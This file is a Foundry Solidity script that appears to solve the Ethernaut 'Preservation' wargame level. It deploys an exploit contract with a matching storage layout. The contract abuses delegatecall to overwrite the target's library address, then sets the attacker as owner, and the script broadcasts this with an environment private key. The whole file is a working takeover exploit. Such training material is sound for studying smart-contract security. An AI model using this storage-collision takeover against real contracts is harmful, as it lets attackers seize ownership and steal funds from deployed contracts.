// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/16-Preservation.sol"; 


contract Exploit {
    address public variable1;
    address public variable2;
    address public owner;
    address public PreservationInstance;

    constructor(address _PreservationInstance) {
        PreservationInstance = _PreservationInstance;
    }


    // function attack1() public {
    //     preservation.setFirstTime(uint256(uint160(address(this))));
    // }

    // function attack2(address _hacker) public {
    //     preservation.setFirstTime(uint256(uint160( _hacker)));
    // }

    function attack(Preservation preservationInstance) external {
        // 覆盖库地址
        preservationInstance.setFirstTime(uint256(uint160(address(this))));
        //梗概owner
        preservationInstance.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _timeStamp) external {
        owner = address(uint160(_timeStamp));
    }
}

contract Exp is Script {

    Preservation public PreservationInstance = Preservation(payable(0x1E579170DFdaC0d80Aef7759Cb4B5B5F10b606b7));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 

    function run() external {
        vm.startBroadcast(hacker);

        Exploit attacker = new Exploit(address(PreservationInstance));
        attacker.attack(PreservationInstance);
        console.log("new owner:", PreservationInstance.owner());

        vm.stopBroadcast();
    }
}
